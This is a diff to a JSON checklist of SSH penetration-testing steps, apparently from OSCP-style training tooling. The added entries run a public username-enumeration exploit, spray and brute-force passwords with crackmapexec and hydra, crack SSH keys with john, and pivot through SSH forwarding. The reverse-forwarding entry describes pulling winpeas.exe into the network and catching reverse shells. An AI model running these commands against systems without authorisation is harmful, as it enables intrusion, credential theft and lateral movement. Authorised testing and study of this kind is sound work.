@@ -1,10 +1,10 @@
 {
   "service": "SSH",
   "port": 22,
-  "checklist": [
+  "tasks": [
     {
       "id": "ssh_banner",
-      "title": "Banner Grabbing & Service Fingerprinting",
+      "title": "Banner Grabbing & Fingerprinting",
       "description": "Identify the exact OpenSSH version and underlying OS distribution.",
       "commands": [
         "nc -vn {target_ip} 22",
@@ -25,26 +25,52 @@
       "title": "Username Enumeration",
       "description": "Attempt to enumerate valid usernames if older OpenSSH versions (<= 7.7) are in use.",
       "commands": [
-        "nmap --script ssh-auth-methods --script-args=\"ssh.user=<username>\" -p 22 {target_ip}",
-        "searchsploit -m 40136"
+        "searchsploit -m 40136",
+        "python3 40136.py {target_ip} users.txt"
       ]
     },
     {
-      "id": "ssh_bruteforce",
-      "title": "Credential Brute-Forcing",
-      "description": "Test weak or default passwords against known user accounts.",
+      "id": "ssh_spray",
+      "title": "Password Spray & Brute-Force",
+      "description": "Test weak passwords against known user accounts.",
       "commands": [
-        "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t 4",
-        "nmap --script ssh-brute -p 22 {target_ip}"
+        "crackmapexec ssh {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success",
+        "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t 4"
       ]
     },
     {
-      "id": "ssh_vuln_search",
-      "title": "Vulnerability Research & Exploit Check",
-      "description": "Check for known vulnerabilities like Debian PRNG or specific OpenSSH CVEs.",
+      "id": "ssh_key_crack",
+      "title": "Private Key Setup & Cracking",
+      "description": "If a key is found, chmod 600 before use. If encrypted, use ssh2john to convert and crack it.",
       "commands": [
-        "searchsploit openssh <version>",
-        "nmap --script ssh-run,sshv1 -p 22 {target_ip}"
+        "chmod 600 id_rsa",
+        "ssh -i id_rsa -p 22 <user>@{target_ip}",
+        "ssh2john id_rsa > ssh.hash",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash"
+      ]
+    },
+    {
+      "id": "ssh_pf_dynamic",
+      "title": "Pivoting: Dynamic Forwarding (-D)",
+      "description": "**The Goal:** Turn your Kali machine into a router for the internal network to use proxychains.\n\n**The Command:** `ssh -N -f -D <Kali_Port> <user>@<Compromised_IP>`\n**Example:** `ssh -N -f -D 1080 admin@{target_ip}`\n\n**How it works:**\n* `1080`: Port that opens locally on your Kali machine.\n* `admin@{target_ip}`: The pivot machine you are logging into.\n\n**The Result:** Update `/etc/proxychains4.conf` to `socks5 127.0.0.1 1080`. You can now run `proxychains nmap <Internal_IP>`.",
+      "commands": [
+        "ssh -N -f -D 1080 <user>@{target_ip}"
+      ]
+    },
+    {
+      "id": "ssh_pf_local",
+      "title": "Pivoting: Local Forwarding (-L)",
+      "description": "**The Goal:** Bring a single port from deep inside the network and attach it to your Kali machine (e.g., viewing an internal web server).\n\n**The Command:** `ssh -N -f -L <Kali_Port>:<Target_IP>:<Target_Port> <user>@<Compromised_IP>`\n**Example:** `ssh -N -f -L 9000:172.16.50.10:80 admin@{target_ip}`\n\n**How it works:**\n* `9000`: Port that opens on your Kali machine.\n* `172.16.50.10:80`: The internal IP/Port you want to reach (use 127.0.0.1 if it's local to the pivot box).\n* `admin@{target_ip}`: The pivot machine you are logging into.\n\n**The Result:** Navigate to `http://127.0.0.1:9000` on your Kali browser to see the internal site.",
+      "commands": [
+        "ssh -N -f -L 9000:127.0.0.1:80 <user>@{target_ip}"
+      ]
+    },
+    {
+      "id": "ssh_pf_reverse",
+      "title": "Pivoting: Reverse Forwarding (-R)",
+      "description": "**The Goal:** Send a port from your Kali machine into the compromised network. Critical for serving files (like winpeas) or catching reverse shells on deeply internal machines.\n\n**The Command:** `ssh -N -f -R <Compromised_Port>:<Kali_IP>:<Kali_Port> <user>@<Compromised_IP>`\n**Example:** `ssh -N -f -R 8080:127.0.0.1:80 admin@{target_ip}`\n\n**How it works:**\n* `8080`: Port that opens on the compromised machine.\n* `127.0.0.1:80`: Points to the Python web server running on your Kali machine.\n* `admin@{target_ip}`: The pivot machine you are logging into.\n\n**The Result:** Anyone on the internal network can now run `wget http://{target_ip}:8080/winpeas.exe`, tunneling traffic back to your Kali port 80.",
+      "commands": [
+        "ssh -N -f -R 8080:127.0.0.1:80 <user>@{target_ip}"
       ]
     }
   ]
